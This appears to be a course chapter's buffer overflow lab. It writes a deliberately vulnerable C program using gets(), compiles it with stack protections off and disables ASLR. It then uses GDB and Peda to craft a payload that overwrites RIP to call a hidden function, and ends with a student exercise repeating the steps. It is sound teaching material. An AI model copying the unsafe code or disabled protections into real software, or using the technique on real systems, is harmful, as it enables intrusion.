> I'll demonstrate a Linux binary stack based buffer overflow vulnerability and exploit in the following activity.  First, I'll create a vulnerable program written in C that fails to validate a user input.  I'll disable all security settings for the sake of demonstration and compile the vulnerable binary using gcc.  Then I will use GDB and the Peda plugin to analyze the binary, craft an exploit, and cause the program to execute code it was not intended to.
> 
> Using the Kali VM in Bridge Adapter network mode, I start a terminal and install GDB with the following command.
> ```bash
> sudo apt update -y
> sudo apt install gdb -y
> ```
> ![[../images/06/buffer_activity_gdb_install.png|Installing GDB on Kali|600]]
> After GDB installation is complete I clone the Peda repository and the associated Python binary to the GDB configuration file.  Peda enhances GDB with features and formatting that I personally enjoy.
> ```bash
> git clone https://github.com/longld/peda.git ~/peda
> echo "source ~/peda/peda.py" >> ~/.gdbinit
> ```
> ![[../images/06/buffer_activity_peda_install.png|Installing and Configuring Peda|600]]
> With GDB and Peda setup, I'll create the vulnerable C program under the file `program.c`.  This very simple program includes two functions called `hidden` and `main`.  The main function creates a buffer space of 100 bytes and uses the `gets` utility to accept user input and renders the input from the printf function.  The hidden function simply displays a static message; however there is no execution path to it from main.  This hidden function won't ever be ran by in this simple application.  I place the following source code into the program.c file.  
> ```c
> #include <stdio.h>
> void hidden(){
> 	printf("Congrats, you found me!\n");
> }
> int main(){
> 	char buffer[100];
> 	gets(buffer);
> 	printf("Buffer Content is : %s\n",buffer);
> }
> ```
> ![[../images/06/buffer_activity_program_source.png|Program Source Code|600]]
> After the C code is written, I compile it using the GCC compiler while application level security settings into an executable file `program`.  The compiler's output warns us the the gets function is dangerous - we'll ignore that concern and exploit it soon.
> ```bash
> gcc  -no-pie -fno-stack-protector -z execstack program.c -o program
> ```
> ![[../images/06/buffer_activity_compile.png|Compiling the Vulnerable Program|600]]
> I also want to disable ASLR protections on the operating system with the following command.  This ensures that each time our program runs it will use the same address space.
> ```bash
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```
> ![[../images/06/buffer_activity_aslr_disable.png|Disabling ASLR Protections|600]]
> When the program is ran from the command line it waits for a user input.  When an input is entered the program takes the input and places it on the stack and then retrieves the value and prints it to the screen.  At no time is the hidden function executed as the static message "Congrats, you found me!" is displayed. I run the function using the following command and supplying it with "lol" then pressing enter.  As expected, it reflects back what I inputed.
> ```bash
> ./program
> lol
> ```
> ![[../images/06/buffer_activity_baseline_input.png|Running Program With Non-Malicious Input|600]]
> I'll run the program again, but this time I'll supply it with around 150 letter "A"s.  This time the program returns a segmentation fault which means it likely found a return address in memory that it could not find so the program crashes.  This demonstrates the identification of the vulnerability as a well behaving program would fail gracefully.
> ```
> ./program
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> ```
> ![[../images/06/buffer_activity_segfault.png|Identifying the Buffer Overflow|600]]
> Now that an overflow vulnerability was detected I can being to explore how to hijack the execution flow of the program using the GDB debugger.  Before I start the application in the dugger I create an input.txt file that has 200 letter "A"s using Python.
> ```bash
> python -c "print('A'*200)" > input.txt
> ```
> ![[../images/06/buffer_activity_input_test.png|Creating Input File|600]]
> To launch the program into the debugger I run GDB with the `-q` flag to ignore the onload header and version banner while supplying GDB with the program name.  After GDB launches I am presented with the gdb-peda command line interface.
> ```bash
> gdb -q ./program
> ```
> ![[../images/06/buffer_activity_gdb_start.png|Starting Program in GDB|600]]
> With GDB started I run the program and redirect the input text file with 200 "A"s into the program.  The program loads with the content of index.txt and immediately segmentation faults (segfaults).
> ```bash
> run < input.txt
> ```
> ![[../images/06/buffer_activity_gdb_segfault.png|Running Program in GDB with Input|600]]
> GDB returns the register, code, and stack at the time of the segfault.  The first section of the GDB report shows me all the CPU registers and their values when the program crashed.  The 200 "A"s filled up the buffer and then wrote over the stack and base pointer (RBP/RSP) registers which cause the program to crash.
> ![[../images/06/buffer_activity_initial_registers.png|Initial Crash Registers|600]]
> The bottom half of the report includes the code, stack, and summary sections.  The stack if filled with the letter "A" and the end of the report suggests that the program reached an address `0x401196` referenced in the index pointer (RIP) to a location memory that return a value that was not accessible or executable by the program so it crashed.
> ![[../images/06/buffer_activity_initial_stack.png|Initial Crash Stack|600]]
> I want to target the index pointer register to eventually hijack the execution flow by inserting an address into the index pointer to code that I want to run - the hidden function.  I need to identify which position of the 200 "A"s write into the index pointer register.  I use the Peda pattern create utlitity which make a non-repeating string that I'll use as the input when I rerun the program.  Then I can see the value written into the index pointer and find the position in the pattern create string that matches telling me which character position of my input eventually overwrites the index pointer.
> ```bash
> pattern create 125 pattern.txt
> ```
> ![[../images/06/buffer_activity_pattern.png|GDB Pattern Create|600]]
> I run the GDB loaded program again but redirect the input pattern.txt.  Once again this causes the program to crash except this time I can observe the RIP has a string value `jAA9A` that will match some part of the string from pattern.txt.
> ```bash
> run < pattern.txt
> ```
> ![[../images/06/buffer_activity_pattern_crash.png|Crash From Pattern Input|600]]
> Using the Peda plugin pattern tool again, I reference the index pointer value from the crash to find the character position that overwrites the index pointer, called the *offset*.  The pattern offset command requires the hexadecimal value of the string.  The offset command identifies that the 120th character is the start of the string segment.
> ```bash
> pattern offset 0x413941416a
> ``` 
>  ![[../images/06/buffer_activity_offset.png|Pattern Offset Character Position|600]]
>  To test the offset I'll craft a new input that places 120 letter "A"s and then 6 letter "B"s into a new text file using a fresh terminal (outside of GDB).  This file will next be used as the input to another run command that causes another crash.
>  ```bash
>  python -c 'print("A"*120+"BBBBBB")' > rip.txt
>  ```
>  ![[../images/06/buffer_activity_rip_test.png|Crafting Index Pointer Offset Test Input|600]]
>  Running the new input should cause the program to crash, except this time the index pointer should be overwritten with just the letter "B".  Once confirmed, I can swap out that position in the input with another memory address where I want the program to execute.
>  ```bash
>  run < rip.txt
>  ```
>  ![[../images/06/buffer_activity_write_b.png|Testing Index Pointer Overwrite with B|600]]
>  Looking at the index pointer I see it is now `0x424242424242` which is hexadecimal for the letter "B"!  Now that I have demonstrated that I can take control of the program, I need to identify what code that is loaded into memory that I want to execute.  As the objective of this demonstration was to execute the `hidden` function that is otherwise unreachable, I need to find where that function is on the stack.  To do this I use the `p` command in GDB and supply the name of the function which returns its memory address `0x401146`.
>  ```bash
>  p hidden
>  ```
>  ![[../images/06/buffer_activity_func_address.png|Finding Hidden Function's Address|600]]
>  Now I have all the pieces needed to craft an exploit that hijacks the program's execution path and causes the hidden function to be executed.  My goal is to overwrite the index pointer with the address of the hidden function.  This will require me to convert that hidden function address into shellcode little endian 64-bit format which is `\x46\x11\x40\x00\x00\x00`.  This is the reverse order of hexadecimal values with `00` used as padding to fill the 64-bit space.  Note that each hexadecimal has `\x` preceding it.  I place 120 "A"s and then the shellcode address to the hidden function into an exploit text file from a new terminal outside of GDB.  Observe too that the hexadecimal is not render to standard output because the values are non-ascii.
>  ```bash
>  python -c 'print("A"*120+"\x46\x11\x40\x00\x00\x00")' > exploit.txt
>  ```
>  ![[../images/06/buffer_activity_exploit_dev.png|Crafting Exploit|600]]
>  Finally, it is time to run the program with the exploit as the input and see if I get the hidden function to print the static "Congrats, you found me!" output.
>  ```bash
>  ./program < exploit.txt
>  ```
>  ![[../images/06/buffer_activity_exploited.png|Program Exploited|600]]Huzzah!


> [!exercise] Exercise - Stack Smashing the Hidden Function
> In this task you will exploit a stack-based buffer overflow vulnerable C program using your Kali VM in Bridge Adapter network mode.  You will install the needed tools, build the vulnerable application, discover the buffer overflow, then build an exploit that will execute the hidden function.
> #### Step 1 - Install GDB
> GNU debugger (GDB) is used to debug in-memory applications and is very useful for finding and exploiting buffer overflows. First update your system and then install gdb.  Accept default settings in prompts by pressing enter.
> ``` bash
> sudo apt update -y
> sudo apt install gdb -y
> ```
> #### Step 2 - Install Peda
> Next, install Peda after GDB is installed. The peda extension for GDB offers additional utilities.
> ``` bash
> git clone [https://github.com/longld/peda.git](https://github.com/longld/peda.git) ~/peda
> echo "source ~/peda/peda.py" >> ~/.gdbinit
> ```
> #### Step 3 - Create the Vulnerable Binary
> Create a C program using the following code and then compile it without any security settings.
> ```bash
> vi program.c 
> ```
> While in the editor, add the following code.
> ``` c
> #include <stdio.h>  
> void hidden(){  
>         printf("Congrats, you found me!\n");  
> }  
> int main(){  
>	 char buffer[100];  
>         gets(buffer);  
>         printf("Buffer Content is : %s\n",buffer);  
> }
> ```
> Once the file is created, compile it using gcc.
> ``` bash 
> gcc  -no-pie -fno-stack-protector -z execstack program.c -o program
> ```
> #### Step 4 - Disable ASLR
> Left enabled, ASLR will randomize the program’s addresses each time it is ran.  You will disable this security setting for ease of demonstration.
> ``` bash
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```
> #### Step 5 - Explore the Binary
> Explore the application by running it and entering a short value.  *Note, you may need to update the program’s permissions to allow execution.*
> ``` bash
> chmod +x program
> ./program
> ```
> Then enter “lol” and observe the program outputs the buffer content.
> #### Step 6 - Find the Overflow
> Create an input file of all “A”s then run it in the GDB debugger. Observe the RBP register is filled with the letter “A” or 0x41 in hex.
> ```bash
> python -c "print('A' *200)" > input.txt
> gdb -q ./program
> ```
> While in GDB, execute the following command to run the application with the input file and observe a segmentation fault (overflow).
> ``` gdb
> run < input.txt
> ```
> #### Step 7 - Find the Offset
> Create a nonrepeating pattern and run it in the program to detect which byte/character position overwrites the RIP pointer register.  While in GDB run the following commands
> ``` gdb
> pattern create 125 pattern.txt
> run < pattern.txt
> ```
> The program will crash at a return address. This address, which is located in the RIP register as well as the last line of GDB output, isn’t a real address. It is in fact a segment of our pattern that was overwritten to the RIP. The RIP expects an address for a value but received our pattern text which doesn’t point to a real address so the program crashed. You can use this fake address value and lookup what offset position it is in as part of our full pattern. Make sure to replace `ADDRESS` with the value you detected. The offset may be 120 characters.  While in GDB run the following:
> ``` gdb
> pattern offset ADDRESS
> ```
> #### Step 8 - Verify RIP
> Open another terminal and create a rip.txt file payload that is designed to overwrite the RIP with the letter “B” (\x42). Then run the program with the rip.txt input within GDB.  While in a terminal (not GDB), run the following to create the rip.txt file.
> ```bash
> python -c 'print("A"*120+"BBBBBB")' > rip.txt
> ```
> In the GDB terminal, run the following to execute the binary with the rip.txt file.
> ```gdb
> run < rip.txt
> ```
> Observe the RIP/overflow address is 0x000042424242! 42 in hex is the letter B, so you have now proven we can overwrite the RIP address pointer with any value of our choosing and can hijack the program to run anything you want.
> #### Step 9 - Find Hidden Function Address
> Now that you control the RIP, you want to redirect the program to the hidden function. You must first determine the hidden functions address space in memory.  Run the following command while in GDB to identify the memory address of the hidden function (Eg “0x401146”).
> ```gdb
> p hidden
> ```
> #### Step 10 - Exploit Payload
> Craft exploit to point RIP to hidden function address. Remember little endian format which places the 6 bytes in reverse order and uses 00 for any missing bytes. In your non GDB terminal, craft an exploit.txt replacing the RIP section (Bs) with the hidden function’s address in little endian format. Use the hidden function's address discovered during the previous step which is 3 bytes long. Prepend three sets of 00s to make the address 6 bytes long (Eg "0x000000401146"). Next reverse each byte position remembering that a byte is 2 characters (Eg "461140000000"). Finally format each byte with a preceding “\x” which is acceptable shellcode (Eg "\x46\x11\x40\x00\x00\x00"). Use this value in the following command's `SHELLCODE` placeholder.  From a non GDB terminal, run the following command to create the exploit.txt file, make sure to change your little endian address if/as needed.
> ```
> python -c 'print("A"*120+"SHELLCODE")' > exploit.txt
> ```
> Observe hidden function message “Congrats, you found me!”!

[^1]:Windows 11 22h2 - Kernel Privilege Elevation; Exploit-DB 02/24/2024; https://www.exploit-db.com/exploits/51544
[^2]: How to View and Modify Service Permissions in Windows; Winhelponline; May 7, 2021; https://www.winhelponline.com/blog/view-edit-service-permissions-windows/
[^3]: Linux Privilege Escalation; Hacktricks Carlos Polop; Feb 25, 2024; https://book.hacktricks.xyz/linux-hardening/privilege-escalation
[^4]: base64; GTFOBins; Feb 25, 2024; https://gtfobins.github.io/gtfobins/base64/